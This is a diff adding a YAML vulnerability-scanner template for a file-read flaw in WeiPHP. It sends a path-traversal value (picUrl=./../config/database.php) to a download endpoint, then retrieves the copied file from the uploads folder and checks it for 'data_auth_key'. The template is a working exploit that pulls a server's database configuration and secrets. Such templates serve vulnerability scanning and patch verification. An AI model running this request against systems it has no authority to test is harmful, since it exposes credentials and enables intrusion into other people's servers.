@@ -1,0 +1,43 @@
+id: yaml-poc-weiphp-weiphp-readfile-CT-158545
+info:
+  name: Yaml Poc Weiphp Weiphp Readfile Ct 158545
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-weiphp-weiphp-readfile-CT-158545'
+  tags: lfi
+  reference: []
+http:
+- method: POST
+  path:
+  - /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
+  body: '"1":1
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /public/index.php/home/file/user_pics
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /public/uploads/picture/{{img}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - data_auth_key
+    - WeiPHP
